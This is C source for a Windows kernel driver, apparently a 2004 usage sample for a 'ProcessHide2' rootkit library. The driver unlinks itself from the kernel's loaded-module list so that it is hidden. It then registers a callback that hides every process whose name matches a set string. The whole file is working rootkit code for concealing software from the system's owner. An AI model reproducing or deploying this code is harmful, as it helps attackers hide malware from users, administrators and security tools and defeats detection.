/*++

Module Name:

    hidecmd.c

Abstract:

    ProcessHide2 usage sample.

Author:

    90210 30-Nov-2004

--*/

#define DEBUG

#include "hidecmd.h"

ULONG	ProcessNameOffset=0;

static PVOID	g_hCode,g_hData;

// called at IRQL DISPATCH_LEVEL
UCHAR IsProcessHidden(PEPROCESS Process)
{
	PCHAR	nameptr;
	BOOLEAN	rc=FALSE;

	// who knows
	if (!Process || !ProcessNameOffset) return FALSE;

	try {
		nameptr = (PCHAR)Process + ProcessNameOffset;
		// check the process name
		if (!_strnicmp(nameptr,HIDDEN_PROCESS,strlen(HIDDEN_PROCESS)))
			// we should hide it
			rc=TRUE;
		else
			rc=FALSE;
	} except(EXCEPTION_EXECUTE_HANDLER) {
		rc=FALSE;
	}

	return rc;
}


// Copyright (C) 1996-2001 Mark Russinovich and Bryce Cogswell
ULONG GetProcessNameOffset(VOID)
{
	PEPROCESS	curproc;
	int	i;

	curproc = PsGetCurrentProcess();

	//
	// Scan for 12KB, hoping the KPEB never grows that big!
	//
	for( i = 0; i < 3*PAGE_SIZE; i++ ) {

		if( !strncmp( SYSNAME, (PCHAR) curproc + i, strlen(SYSNAME) )) {

			return i;
		}
	}

	//
	// Name not found - oh, well
	//
	return 0;
}


VOID HideDriver(PDRIVER_OBJECT DriverObject)
{
	PLDR_DATA_TABLE_ENTRY	DriverEntry;
	KIRQL	OldIrql;

	OldIrql=KeRaiseIrqlToDpcLevel();

	try {
		// remove driver from PsLoadedModuleList
		DriverEntry=DriverObject->DriverSection;
		RemoveEntryList(&DriverEntry->InLoadOrderLinks);
		InitializeListHead(&DriverEntry->InLoadOrderLinks);
	} except(EXCEPTION_EXECUTE_HANDLER) {
	}

	KeLowerIrql(OldIrql);
	return;
}

VOID UnlockSections()
{
	MmUnlockPagableImageSection(g_hCode);
	MmUnlockPagableImageSection(g_hData);
	return;
}


NTSTATUS DriverUnload(IN PDRIVER_OBJECT DriverObject)
{
	ShutdownPhide();
	return STATUS_SUCCESS;
}

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject,IN PUNICODE_STRING RegistryPath)
{
	DriverObject->DriverUnload=DriverUnload;

	g_hCode=MmLockPagableCodeSection(&IsProcessHidden);
	g_hData=MmLockPagableDataSection(&g_hCode);

	if (!(ProcessNameOffset = GetProcessNameOffset())) {
		UnlockSections();
		return STATUS_UNSUCCESSFUL;
	}

	HideDriver(DriverObject);

	if (!NT_SUCCESS(ProcessHide(IsProcessHidden))) {
		UnlockSections();
		return STATUS_UNSUCCESSFUL;
	}

	return STATUS_SUCCESS; 
}